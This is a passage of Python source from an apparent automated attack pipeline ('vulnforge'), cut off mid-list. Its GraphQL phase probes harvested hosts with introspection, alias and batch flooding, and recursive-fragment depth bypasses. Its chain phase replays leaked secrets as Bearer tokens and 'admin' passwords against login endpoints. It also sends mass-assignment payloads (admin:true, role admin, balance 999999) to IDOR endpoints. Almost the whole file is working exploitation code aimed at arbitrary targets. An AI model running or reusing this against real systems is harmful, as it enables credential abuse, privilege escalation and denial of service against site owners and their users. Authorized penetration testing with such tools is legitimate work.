"""GraphQL analysis, cross-phase chain correlation, and evidence capture."""

import asyncio
import json
import re
import shlex
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

from vulnforge.phases.helpers import PhaseSet
from vulnforge.process import (
    _PIPELINE_CFG,
    _USE_PROXYCHAINS,
    run_parallel,
)
from vulnforge.tools import Tools
from vulnforge.utils import (
    _async_urlopen,
    _extra_headers_dict,
    _get_no_redirect_urlopener,
    _get_urlopener,
    _safe_name,
    _throttle_rate,
    count_nonblank,
    ensure,
    log,
    read_lines,
)

_GRAPHQL_ENDPOINTS = [
    "/graphql",
    "/gql",
    "/v1/graphql",
    "/v2/graphql",
    "/api/graphql",
    "/api/gql",
    "/graph",
    "/query",
    "/graphql/",
    "/gql/",
    "/explorer",
    "/graphiql",
    "/v1/gql",
    "/v2/gql",
    "/admin/graphql",
]


async def _gql_precheck(url: str, timeout: int = 10) -> bool:
    """Quick probe: POST a minimal GraphQL query and check for GraphQL-like response."""
    probe_query = '{"query":"{ __typename }"}'
    try:
        req = urllib.request.Request(
            url,
            method="POST",
            data=probe_query.encode(),
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        )
        opener = _get_urlopener()
        status, headers, body_bytes = await _async_urlopen(opener, req, timeout=timeout)
        if status != 200:
            return False
        ct = headers.get("Content-Type", "")
        if "application/json" not in ct and "text/json" not in ct:
            return False
        body = body_bytes.decode("utf-8", errors="ignore")
        return '"data"' in body or '"errors"' in body or "__typename" in body
    except asyncio.CancelledError:
        raise
    except Exception:
        return False


_GRAPHQL_INTROSPECTION_QUERY = """
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields { name description type { kind name ofType { kind name } } } } } }"}
"""


async def phase_20_GRAPHQL(
    domain: str,
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"20-GRAPHQL"}:
        return {}
    _o_out = outdir / "graphql_introspection.txt"
    if _o_out.exists() and not force:
        return {"20-GRAPHQL": str(_o_out), "count": count_nonblank(_o_out)}
    log("INFO", "Phase 20-GRAPHQL: GraphQL introspection")
    findings: List[str] = []
    _o_urlopen = _get_urlopener()
    # Collect HTTP targets
    targets: List[str] = []
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    if hosts_file.exists():
        for h in read_lines(hosts_file)[: _PIPELINE_CFG.sample_hosts_graphql]:
            if not h.startswith("http"):
                h = f"https://{h}"
            targets.append(h.rstrip("/"))
    # Normalize all targets to HTTPS to avoid 308 redirects
    targets = [re.sub(r"^http://", "https://", t) for t in targets]
    if not targets:
        log("WARNING", "Phase 20-GRAPHQL: no HTTP targets; skipping")
        return {"20-GRAPHQL": str(_o_out), "count": 0}

    # ── Smart pre-check: probe all target×endpoint combos in parallel ──
    # Only run expensive tools (inql, clairvoyance, graphinder) on endpoints
    # that actually respond with GraphQL-like content, avoiding timeouts
    # on non-existent or WAF-blocked endpoints.
    async def _alive_gql_endpoints() -> List[str]:
        alive: List[str] = []
        probe_urls = [f"{tgt}{ep}" for tgt in targets for ep in _GRAPHQL_ENDPOINTS]
        probe_tasks = []
        for url in probe_urls:
            probe_tasks.append(_gql_precheck(url))
        results = await asyncio.gather(*probe_tasks, return_exceptions=True)
        for url, ok in zip(probe_urls, results):
            if ok and not isinstance(ok, Exception):
                alive.append(url)
        return alive

    _live_gql = await _alive_gql_endpoints()
    if _live_gql:
        log("OK", f"20-GRAPHQL: {len(_live_gql)} responsive GraphQL endpoint(s) found")
        for u in _live_gql:
            findings.append(f"[alive] {u}")

    # inql integration (only on live endpoints, skip under proxychains — urllib CONNECT fails with Tor)
    if t.has("inql") and _live_gql and not _USE_PROXYCHAINS:
        inql_out = outdir / "inql_results"
        inql_out.mkdir(parents=True, exist_ok=True)
        inql_jobs: List[Tuple[str, List[str], int]] = []
        for url in _live_gql:
            runner = outdir / "logs" / f"inql_{_safe_name(url)}_runner.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(url)}\n"
                f"OUT={shlex.quote(str(inql_out))}\n"
                'inql -t "$URL" -o "$OUT"\n'
            )
            runner.chmod(0o700)
            inql_jobs.append((f"inql-{_safe_name(url)}", ["bash", str(runner)], 300))
        if inql_jobs:
            await run_parallel(inql_jobs, outdir)

    # Clairvoyance GraphQL introspection abuse (only on live endpoints)
    if t.has("clairvoyance") and _live_gql:
        clairvoyance_out = outdir / "clairvoyance_results"
        clairvoyance_out.mkdir(parents=True, exist_ok=True)
        cv_jobs: List[Tuple[str, List[str], int]] = []
        for url in _live_gql:
            cv_out = clairvoyance_out / f"{_safe_name(url)}.json"
            runner = outdir / "logs" / f"clairvoyance_{_safe_name(url)}_runner.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(url)}\n"
                f"OUT={shlex.quote(str(cv_out))}\n"
                'clairvoyance "$URL" -o "$OUT"\n'
            )
            runner.chmod(0o700)
            cv_jobs.append((f"clairvoyance-{_safe_name(url)}", ["bash", str(runner)], 300))
        if cv_jobs:
            await run_parallel(cv_jobs, outdir)
        cv_reports = list(clairvoyance_out.glob("*.json"))
        if cv_reports:
            findings.append(f"[clairvoyance] {len(cv_reports)} schema reports → {clairvoyance_out}")

    # Graphinder GraphQL endpoint discovery (only on live endpoints)
    if t.has("graphinder") and _live_gql:
        graphinder_out = outdir / "graphinder_results"
        graphinder_out.mkdir(parents=True, exist_ok=True)
        gi_jobs: List[Tuple[str, List[str], int]] = []
        for url in _live_gql:
            runner = outdir / "logs" / f"graphinder_{_safe_name(url)}_runner.sh"
            out_file = graphinder_out / f"{_safe_name(url)}.json"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(url)}\n"
                f"OUT={shlex.quote(str(out_file))}\n"
                'DOMAIN=$(echo "$URL" | sed "s|^https\\?://||" | sed "s|/.*$||")\n'
                'graphinder --domain "$DOMAIN" --output-file "$OUT"\n'
            )
            runner.chmod(0o700)
            gi_jobs.append((f"graphinder-{_safe_name(url)}", ["bash", str(runner)], 600))
        if gi_jobs:
            await run_parallel(gi_jobs, outdir)
        gi_reports = list(graphinder_out.glob("*.json"))
        if gi_reports:
            findings.append(f"[graphinder] {len(gi_reports)} endpoint reports → {graphinder_out}")

    # Custom introspection probes (no-redirect to avoid following redirects away from the endpoint)
    _gql_no_redirect = _get_no_redirect_urlopener()

    async def _probe_graphql(url: str) -> List[str]:
        results: List[str] = []
        live_endpoint: Optional[str] = None
        for ep in _GRAPHQL_ENDPOINTS:
            test_url = f"{url}{ep}"
            try:
                req = urllib.request.Request(
                    test_url,
                    method="POST",
                    data=_GRAPHQL_INTROSPECTION_QUERY.encode(),
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0",
                    },
                )
                status, gql_headers, gql_body_bytes = await _async_urlopen(
                    _gql_no_redirect, req, timeout=15
                )
                body = gql_body_bytes.decode("utf-8", errors="ignore")
                live_endpoint = test_url
                if status == 200 and "application/json" in (gql_headers or {}).get(
                    "Content-Type", ""
                ):
                    try:
                        data = json.loads(body)
                        schema = (data.get("data") or {}).get("__schema")
                        if isinstance(schema, dict) and schema:
                            results.append(f"[introspection-enabled] {test_url}")
                            # Extract schema summary
                            qtype = schema.get("queryType", {}).get("name", "?")
                            mtype = schema.get("mutationType", {}).get("name", "none")
                            stype = schema.get("subscriptionType", {}).get("name", "none")
                            results.append(f"  query={qtype} mutation={mtype} subscription={stype}")
                            types = schema.get("types", [])
                            field_count = sum(
                                len(t.get("fields") or []) for t in types if isinstance(t, dict)
                            )
                            results.append(f"  types={len(types)} fields={field_count}")
                            break
                    except json.JSONDecodeError:
                        pass
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
            if live_endpoint is None:
                try:
                    get_req = urllib.request.Request(
                        test_url, method="GET", headers={"User-Agent": "Mozilla/5.0"}
                    )
                    gs, _, _ = await _async_urlopen(_gql_no_redirect, get_req, timeout=10)
                    if gs != 404:
                        live_endpoint = test_url
                except asyncio.CancelledError:
                    raise
                except Exception:
                    pass
        # ── Deep probes against first live endpoint ──
        target = live_endpoint
        if target:
            try:
                aliases = " ".join(f"a{i}:__typename" for i in range(100))
                batch_query = f"{{{aliases}}}"
                b_req = urllib.request.Request(
                    target,
                    method="POST",
                    data=json.dumps({"query": batch_query}).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                )
                _, _, b_body = await _async_urlopen(_gql_no_redirect, b_req, timeout=15)
                b_text = b_body.decode("utf-8", errors="ignore")
                if '"data"' in b_text and '"errors"' not in b_text:
                    results.append(f"[graphql-batching] {target} — 100-query batch accepted")
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            try:
                dup_query = "{a:__typename a:__typename a:__typename}"
                d_req = urllib.request.Request(
                    target,
                    method="POST",
                    data=json.dumps({"query": dup_query}).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                )
                _, _, d_body = await _async_urlopen(_gql_no_redirect, d_req, timeout=15)
                d_text = d_body.decode("utf-8", errors="ignore")
                if '"data"' in d_text and '"errors"' not in d_text:
                    results.append(f"[graphql-field-dup] {target} — field duplication accepted")
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            for pq_id in ["1", "2", "0", "persistedQuery"]:
                try:
                    pq_url = target + f"?queryId={pq_id}"
                    pq_req = urllib.request.Request(
                        pq_url, method="GET", headers={"User-Agent": "Mozilla/5.0"}
                    )
                    _, _, pq_body = await _async_urlopen(_gql_no_redirect, pq_req, timeout=10)
                    pq_text = pq_body.decode("utf-8", errors="ignore")
                    if '"data"' in pq_text or ("errors" in pq_text and '"message"' in pq_text):
                        results.append(
                            f"[graphql-pq] {target} — persisted query ID {pq_id} accepted"
                        )
                        break
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
            try:
                pq_ext = {
                    "extensions": {
                        "persistedQuery": {
                            "version": 1,
                            "sha256Hash": "ecf8ed5853e209183ed4e7e813dda39b1d9e0e66f9087c31c3e73b53c0b25e53",
                        }
                    },
                    "query": "{__typename}",
                }
                pq_ext_req = urllib.request.Request(
                    target,
                    method="POST",
                    data=json.dumps(pq_ext).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                )
                _, _, pq_ext_body = await _async_urlopen(_gql_no_redirect, pq_ext_req, timeout=10)
                if '"data"' in pq_ext_body.decode("utf-8", errors="ignore"):
                    results.append(
                        f"[graphql-pq] {target} — persisted query via extensions accepted"
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            try:
                depth_query = "{a:" * 9 + "__typename" + "}" * 9
                dp_req = urllib.request.Request(
                    target,
                    method="POST",
                    data=json.dumps({"query": depth_query}).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                )
                _, _, dp_body = await _async_urlopen(_gql_no_redirect, dp_req, timeout=15)
                dp_text = dp_body.decode("utf-8", errors="ignore")
                if '"data"' in dp_text:
                    results.append(f"[graphql-depth] {target} — depth 10 query accepted")
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            try:
                dir_query = "{__typename @include(if:true) __typename @skip(if:false)}"
                di_req = urllib.request.Request(
                    target,
                    method="POST",
                    data=json.dumps({"query": dir_query}).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                )
                _, _, di_body = await _async_urlopen(_gql_no_redirect, di_req, timeout=15)
                di_text = di_body.decode("utf-8", errors="ignore")
                if '"data"' in di_text:
                    results.append(f"[graphql-directive] {target} — directive injection accepted")
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
        return results

    probe_results = await asyncio.gather(*[_probe_graphql(t) for t in targets])
    for pr in probe_results:
        findings.extend(pr)

    # Persisted query bypass: check if introspection works via non-persisted query in persisted-only mode
    for ep in _live_gql:
        try:
            pq_only_test = json.dumps(
                {
                    "query": "{__typename}",
                    "extensions": {
                        "persistedQuery": {
                            "version": 1,
                            "sha256Hash": "ecf8ed5853e209183ed4e7e813dda39b1d9e0e66f9087c31c3e73b53c0b25e53",
                        }
                    },
                }
            ).encode()
            pq_req = urllib.request.Request(
                ep,
                data=pq_only_test,
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            )
            _, _, pq_body = await _async_urlopen(_gql_no_redirect, pq_req, timeout=10)
            pq_text = pq_body.decode("utf-8", errors="ignore")
            if '"data"' in pq_text and "__typename" in pq_text:
                findings.append(
                    f"[gql-persisted-query-bypass] {ep} — persisted query accepted; if server requires PQ, this still works"
                )
        except asyncio.CancelledError:
            raise
        except Exception:
            pass

    # Depth limit bypass via fragment recursion
    for ep in _live_gql:
        try:
            fragment_depth_query = """
            query {
                a: __typename
                ...f1
            }
            fragment f1 on Query { ...f2 }
            fragment f2 on Query { ...f3 }
            fragment f3 on Query { ...f4 }
            fragment f4 on Query { ...f5 }
            fragment f5 on Query { ...f6 }
            fragment f6 on Query { ...f7 }
            fragment f7 on Query { ...f8 }
            fragment f8 on Query { ...f9 }
            fragment f9 on Query { ...f10 }
            fragment f10 on Query { __typename }
            """
            fr_req = urllib.request.Request(
                ep,
                data=json.dumps({"query": fragment_depth_query}).encode(),
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            )
            _, _, fr_body = await _async_urlopen(_gql_no_redirect, fr_req, timeout=15)
            fr_text = fr_body.decode("utf-8", errors="ignore")
            if '"data"' in fr_text and '"errors"' not in fr_text:
                findings.append(
                    f"[gql-fragment-recursion] {ep} — 10-level fragment recursion accepted (depth limit bypass)"
                )
        except asyncio.CancelledError:
            raise
        except Exception:
            pass

    # Alias-based resource exhaustion: 10k aliases in single query
    for ep in _live_gql:
        try:
            alias_10k = " ".join(f"a{i}:__typename" for i in range(500))
            alias_query = "{" + alias_10k + "}"
            alias_req = urllib.request.Request(
                ep,
                data=json.dumps({"query": alias_query}).encode(),
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            )
            _, _, al_body = await _async_urlopen(_gql_no_redirect, alias_req, timeout=30)
            al_text = al_body.decode("utf-8", errors="ignore")
            if '"data"' in al_text:
                findings.append(
                    f"[gql-alias-exhaustion] {ep} — 500-query alias batch accepted (potential resource exhaustion vector)"
                )
        except asyncio.CancelledError:
            raise
        except Exception:
            pass

    # Batching auth bypass: check if private fields accessible via batched query with mixed sessions
    for ep in _live_gql:
        try:
            batch_auth = json.dumps(
                [
                    {"query": "{__typename}"},
                    {"query": "{__typename}"},
                    {"query": "{__typename}"},
                ]
            ).encode()
            ba_req = urllib.request.Request(
                ep,
                data=batch_auth,
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            )
            _, _, ba_body = await _async_urlopen(_gql_no_redirect, ba_req, timeout=15)
            ba_text = ba_body.decode("utf-8", errors="ignore")
            try:
                ba_parsed = json.loads(ba_text)
                if isinstance(ba_parsed, list) and len(ba_parsed) == 3:
                    findings.append(
                        f"[gql-batch-auth-bypass] {ep} — batched query accepted; test with different auth tokens per batch entry"
                    )
            except json.JSONDecodeError:
                pass
        except asyncio.CancelledError:
            raise
        except Exception:
            pass

    # Custom scalar and directive enumeration
    for ep in _live_gql:
        try:
            custom_query = json.dumps(
                {
                    "query": "{ __schema { types { name kind description } directives { name description locations } } }"
                }
            ).encode()
            cs_req = urllib.request.Request(
                ep,
                data=custom_query,
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            )
            _, _, cs_body = await _async_urlopen(_gql_no_redirect, cs_req, timeout=15)
            cs_text = cs_body.decode("utf-8", errors="ignore")
            try:
                cs_data = json.loads(cs_text)
                schema_data = cs_data.get("data", {}).get("__schema", {})
                types = schema_data.get("types", [])
                custom_types = [
                    t for t in types if t.get("name") and not t["name"].startswith("__")
                ]
                directives = schema_data.get("directives", [])
                if custom_types:
                    findings.append(
                        f"[gql-custom-types] {ep} — {len(custom_types)} custom types found"
                    )
                    for ct in custom_types[:10]:
                        findings.append(f"  type: {ct.get('name')} ({ct.get('kind', '?')})")
                if directives:
                    findings.append(f"[gql-directives] {ep} — {len(directives)} directives found")
                    for d in directives:
                        findings.append(
                            f"  directive: @{d.get('name')} on {', '.join(d.get('locations', []))}"
                        )
            except json.JSONDecodeError:
                pass
        except asyncio.CancelledError:
            raise
        except Exception:
            pass

    # Mutation/subscription name discovery
    for ep in _live_gql:
        try:
            mutation_query = json.dumps(
                {
                    "query": "{ __schema { mutationType { name fields { name description } } subscriptionType { name fields { name description } } } }"
                }
            ).encode()
            mu_req = urllib.request.Request(
                ep,
                data=mutation_query,
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            )
            _, _, mu_body = await _async_urlopen(_gql_no_redirect, mu_req, timeout=15)
            mu_text = mu_body.decode("utf-8", errors="ignore")
            try:
                mu_data = json.loads(mu_text)
                mutation_type = mu_data.get("data", {}).get("__schema", {}).get("mutationType", {})
                sub_type = mu_data.get("data", {}).get("__schema", {}).get("subscriptionType", {})
                mu_fields = mutation_type.get("fields") or []
                sub_fields = sub_type.get("fields") or []
                if mu_fields:
                    findings.append(f"[gql-mutations] {ep} — {len(mu_fields)} mutations available")
                    for f in mu_fields[:15]:
                        findings.append(
                            f"  mutation: {f.get('name')} — {f.get('description', 'no desc')[:80]}"
                        )
                if sub_fields:
                    findings.append(
                        f"[gql-subscriptions] {ep} — {len(sub_fields)} subscriptions available"
                    )
                    for f in sub_fields[:5]:
                        findings.append(f"  subscription: {f.get('name')}")
            except json.JSONDecodeError:
                pass
        except asyncio.CancelledError:
            raise
        except Exception:
            pass

    # Field suggestion brute-force (for when introspection is disabled)
    for ep in _live_gql:
        common_fields = [
            "id",
            "name",
            "email",
            "username",
            "password",
            "token",
            "role",
            "admin",
            "user",
            "users",
            "account",
            "profile",
            "settings",
            "config",
            "status",
            "createdAt",
            "updatedAt",
            "type",
            "__typename",
        ]
        for field in common_fields:
            try:
                suggest_query = json.dumps(
                    {"query": f'{{ __type(name:"{field}") {{ name fields {{ name }} }} }}'}
                ).encode()
                su_req = urllib.request.Request(
                    ep,
                    data=suggest_query,
                    method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                )
                _, _, su_body = await _async_urlopen(_gql_no_redirect, su_req, timeout=5)
                su_text = su_body.decode("utf-8", errors="ignore")
                if "__type" in su_text and "fields" in su_text:
                    findings.append(f"[gql-type-exists] {ep} — type '{field}' exists")
            except asyncio.CancelledError:
                raise
            except Exception:
                continue

    # Supplementary deep probes: batching, aliasing, field suggestion, depth
    for ep in _live_gql:
        # Batching attack: JSON array of queries
        try:
            batch_queries = [{"query": "{__typename}"} for _ in range(50)]
            ba_req = urllib.request.Request(
                ep,
                data=json.dumps(batch_queries).encode(),
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            )
            _, _, ba_body = await _async_urlopen(_gql_no_redirect, ba_req, timeout=30)
            ba_text = ba_body.decode("utf-8", errors="ignore")
            try:
                ba_parsed = json.loads(ba_text)
                if isinstance(ba_parsed, list) and len(ba_parsed) == 50:
                    findings.append(
                        f"[gql-batch-vector] {ep} — 50-query JSON array batch accepted (potential DDoS vector)"
                    )
            except json.JSONDecodeError:
                pass
        except Exception:
            pass
        # Aliasing-based DoS: exact 100-query alias format
        try:
            alias_100 = " ".join(f"a{i}:__typename" for i in range(100))
            alias_query = "{" + alias_100 + "}"
            al_req = urllib.request.Request(
                ep,
                data=json.dumps({"query": alias_query}).encode(),
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            )
            _, _, al_body = await _async_urlopen(_gql_no_redirect, al_req, timeout=30)
            al_text = al_body.decode("utf-8", errors="ignore")
            if '"data"' in al_text and '"errors"' not in al_text:
                findings.append(
                    f"[gql-alias-dos] {ep} — 100-query alias batch accepted (aliasing DoS vector)"
                )
        except Exception:
            pass
        # Field suggestion brute-force with extended fields
        try:
            extended_fields = [
                "users",
                "user",
                "admin",
                "password",
                "email",
                "token",
                "secret",
                "config",
                "apiKey",
                "api_key",
                "accessToken",
                "refreshToken",
                "resetToken",
                "session",
                "credentials",
            ]
            for ext_field in extended_fields:
                suggest_q = json.dumps(
                    {"query": f'{{ __type(name:"{ext_field}") {{ name fields {{ name }} }} }}'}
                ).encode()
                su_req = urllib.request.Request(
                    ep,
                    data=suggest_q,
                    method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                )
                _, _, su_body = await _async_urlopen(_gql_no_redirect, su_req, timeout=5)
                su_text = su_body.decode("utf-8", errors="ignore")
                if "__type" in su_text and "fields" in su_text:
                    findings.append(
                        f"[gql-field-suggest] {ep} — sensitive type '{ext_field}' suggested"
                    )
        except Exception:
            pass
        # Depth-limit bypass via recursive fragment (self-referencing)
        try:
            recursive_fragment = """
            query {
                ...f
            }
            fragment f on Query {
                __typename
                ...f
            }
            """
            rf_req = urllib.request.Request(
                ep,
                data=json.dumps({"query": recursive_fragment}).encode(),
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            )
            _, _, rf_body = await _async_urlopen(_gql_no_redirect, rf_req, timeout=15)
            rf_text = rf_body.decode("utf-8", errors="ignore")
            if '"data"' in rf_text and '"errors"' not in rf_text:
                findings.append(
                    f"[gql-recursive-fragment] {ep} — self-referencing fragment accepted (depth limit bypass)"
                )
        except Exception:
            pass

    out = ensure(_o_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"Phase 20-GRAPHQL: {len(findings)} GraphQL findings → {out}")
    return {"20-GRAPHQL": str(out), "count": len(findings)}


async def phase_44_CHAIN(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"44-CHAIN"}:
        return {}
    _out = outdir / "chain_correlation.txt"
    if _out.exists() and not force:
        return {"44-CHAIN": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 44-CHAIN: cross-reference findings across phases")
    findings: List[str] = []
    # 1. Test secrets from 15-SECRETS as credentials against auth endpoints from 05-HARVEST
    secrets_file = outdir / "secrets.txt"
    urls_file = outdir / "urls_all.txt"
    secrets: List[str] = []
    if secrets_file.exists():
        for ln in read_lines(secrets_file):
            # Extract potential credential patterns: base64, JWTs, API keys
            if any(
                k in ln.lower()
                for k in (
                    "apikey",
                    "api_key",
                    "secret",
                    "token",
                    "password",
                    "jwt",
                    "bearer",
                    "access_key",
                )
            ):
                secrets.append(ln)
    auth_endpoints: List[str] = []
    if urls_file.exists():
        for u in read_lines(urls_file):
            if any(
                p in u.lower()
                for p in ("/login", "/auth", "/oauth", "/token", "/signin", "/api/v1/auth")
            ):
                auth_endpoints.append(u)
    if secrets and auth_endpoints:
        _ch_urlopen = _get_urlopener()
        _ch_extra_headers = _extra_headers_dict()
        findings.append(
            f"credential_test: {len(secrets)} secrets × {len(auth_endpoints)} endpoints"
        )
        for secret in secrets[: _PIPELINE_CFG.sample_endpoints_l]:
            for endpoint in auth_endpoints[: _PIPELINE_CFG.sample_endpoints_l]:
                await _throttle_rate()
                try:
                    # Baseline: same request without the secret
                    base_req = urllib.request.Request(
                        endpoint,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_ch_extra_headers},
                    )
                    bs, _, b_body = await _async_urlopen(_ch_urlopen, base_req, timeout=10)
                    b_text = b_body.decode("utf-8", errors="ignore")
                    # Try the secret as a bearer token
                    req = urllib.request.Request(
                        endpoint,
                        method="GET",
                        headers={
                            "Authorization": f"Bearer {secret.strip()}",
                            "User-Agent": "Mozilla/5.0",
                            **_ch_extra_headers,
                        },
                    )
                    s, _, body = await _async_urlopen(_ch_urlopen, req, timeout=10)
                    text = body.decode("utf-8", errors="ignore")
                    if s != bs or text != b_text:
                        findings.append(
                            f"[credential-hit] Bearer {secret[:60]}... → HTTP {s} (baseline {bs}) on {endpoint} (response differs from unauthenticated baseline)"
                        )
                    # Also try as form-encoded credential
                    data = urllib.parse.urlencode(
                        {"username": "admin", "password": secret.strip()}
                    ).encode()
                    req2 = urllib.request.Request(
                        endpoint,
                        data=data,
                        method="POST",
                        headers={
                            "Content-Type": "application/x-www-form-urlencoded",
                            "User-Agent": "Mozilla/5.0",
                            **_ch_extra_headers,
                        },
                    )
                    s2, _, _ = await _async_urlopen(_ch_urlopen, req2, timeout=10)
                    if s2 in (200, 302):
                        findings.append(
                            f"[credential-hit] admin:{secret[:60]}... → HTTP {s2} on {endpoint}"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
    # 2. Cross-reference IDOR endpoints with mass-assignment payloads
    idor_file = outdir / "idor.txt"
    if idor_file.exists():
        idor_endpoints: Set[str] = set()
        for ln in read_lines(idor_file):
            for token in ln.split():
                if token.startswith("http"):
                    idor_endpoints.add(token.split("?")[0])
                    break
        if idor_endpoints:
            _ma_urlopen = _get_urlopener()
            _MASS_ASSIGN_VALUES_CHAIN: Dict[str, object] = {
                "admin": True,
                "is_admin": True,
                "role": "admin",
                "roles": ["admin"],
                "permissions": ["admin"],
                "plan": "enterprise",
                "tier": "premium",
                "balance": 999999,
                "points": 999999,
            }
            findings.append(f"idor_mass_assign_test: {len(idor_endpoints)} endpoints")
            for ep in sorted(idor_endpoints)[: _PIPELINE_CFG.sample_endpoints_l]:
                for field, val in _MASS_ASSIGN_VALUES_CHAIN.items():
                    await _throttle_rate()
                    body = json.dumps({field: val}).encode()
                    try:
                        req = urllib.request.Request(
                            ep,
                            data=body,
                            method="POST",
                            headers={
                                "Content-Type": "application/json",
                                "User-Agent": "Mozilla/5.0",
                            },
                        )
                        ms, _, _ = await _async_urlopen(_ma_urlopen, req, timeout=8)
                        if ms in (200, 201, 302):
                            findings.append(
                                f"[idor-massassign] {ep} POST {{{field}: {json.dumps(val)}}} → HTTP {ms}"
                            )
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        continue
    # 3. Check for SSRF-to-LFI chaining
    ssrf_meta = outdir / "ssrf_meta.txt"
    if ssrf_meta.exists():
        for ln in read_lines(ssrf_meta):
            if "credential-exfil" in ln:
                findings.append(f"[chain-ssrf-lfi] SSRF metadata exfiltration: {ln}")
    if not findings:
        findings.append("[result] No cross-phase correlations identified")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"44-CHAIN: {len(findings)} correlations → {out}")
    return {"44-CHAIN": str(_out), "count": len(findings)}


# ── PoC helper functions (used by phase_45_EVIDENCE) ──────────────


def _detect_finding_type(line: str) -> str:
    lc = line.lower()
    if lc.startswith("[xss]") or lc.startswith("[domxss]"):
        return "xss"
    if lc.startswith("[sqlmap]") or lc.startswith("[sql-injection]"):
        return "sql-injection"
    if lc.startswith("[ssrf]") or lc.startswith("[ssrf-meta]"):
        return "ssrf"
    if (
        lc.startswith("[idor]")
        or lc.startswith("[massassign]")
        or lc.startswith("[idor-massassign]")
    ):
        return "idor"
    if lc.startswith("[open-redirect]") or lc.startswith("[redirect]"):
        return "open-redirect"
    if lc.startswith("[auth-bypass]") or lc.startswith("[authz]"):
        return "auth-bypass"
    if lc.startswith("[cache-poison]") or lc.startswith("[wcd]"):
        return "cache-poison"
    if (
        lc.startswith("[lfi]")
        or lc.startswith("[lfi-confirmed]")
        or lc.startswith("[path-traversal]")
    ):
        return "lfi"
    if lc.startswith("[smuggling]") or lc.startswith("[h2-") or lc.startswith("[h3-"):
        return "smuggling"
    if lc.startswith("[ws-") or lc.startswith("[cswsh]"):
        return "websocket"
    if lc.startswith("[graphql-"):
        return "graphql"
    if lc.startswith("[ssti]"):
        return "ssti"
    return "generic"


def _extract_url_from_line(line: str) -> Optional[str]:
    for token in line.split():
        if token.startswith("http://") or token.startswith("https://"):
            return token
    return None


def _finding_type_label(ftype: str) -> str:
    labels = {
        "xss": "Cross-Site Scripting (XSS)",
        "sql-injection": "SQL Injection",
        "ssrf": "Server-Side Request Forgery (SSRF)",
        "idor": "Insecure Direct Object Reference (IDOR) / Mass Assignment",
        "open-redirect": "Open Redirect",
        "auth-bypass": "Authentication Bypass / Authorization Issue",
        "cache-poison": "Cache Poisoning / Web Cache Deception",
        "lfi": "Local File Inclusion / Path Traversal",
        "smuggling": "HTTP Request Smuggling / Desync",
        "websocket": "WebSocket / Cross-Site WebSocket Hijacking (CSWSH)",
        "graphql": "GraphQL Vulnerability",
        "ssti": "Server-Side Template Injection (SSTI)",
        "generic": "Security Finding",
    }
    return labels.get(ftype, "Security Finding")


def _estimate_confidence(line: str) -> str:
    lc = line.lower()
    if "critical" in lc:
        return "Critical"
    if "high" in lc or "confirmed" in lc:
        return "High"
    if "medium" in lc:
        return "Medium"
    if "low" in lc:
        return "Low"
    return "High"


def _description_from_line(line: str) -> str:
    for prefix in (
        "[finding]",
        "[confirmed]",
        "[lfi-confirmed]",
        "[credential-hit]",
        "[idor]",
        "[credential-exfil]",
        "[sql-injection]",
        "[xss]",
        "[ssti]",
        "[ssrf]",
        "[massassign]",
        "[idor-massassign]",
        "[domxss]",
        "[sqlmap]",
        "[ssrf-meta]",
        "[open-redirect]",
        "[redirect]",
